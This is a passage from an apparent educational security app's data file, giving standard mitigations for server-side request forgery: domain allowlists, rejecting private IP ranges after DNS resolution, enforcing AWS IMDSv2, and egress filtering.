        detailDescription:
          'Enforce strict domain allowlists, resolve DNS to block private IP ranges (RFC 1918 & 169.254.x.x), and enforce AWS IMDSv2 token headers.',
        technicalNotes: [
          'Enforce AWS IMDSv2 with hop limit = 1',
          'Validate and resolve DNS to reject private IP ranges',
          'Firewall egress filtering blocks web tier from internal metadata',
        ],
      },
    },
    labels: {
      request: 'fetch URL',
      unsafe: 'unsafe path',
      impact: 'impact',
      remediate: 'block private IPs',
    },
    nextId: 'A01',
    nextTitle: 'A01 Broken Access Control',
  },
];
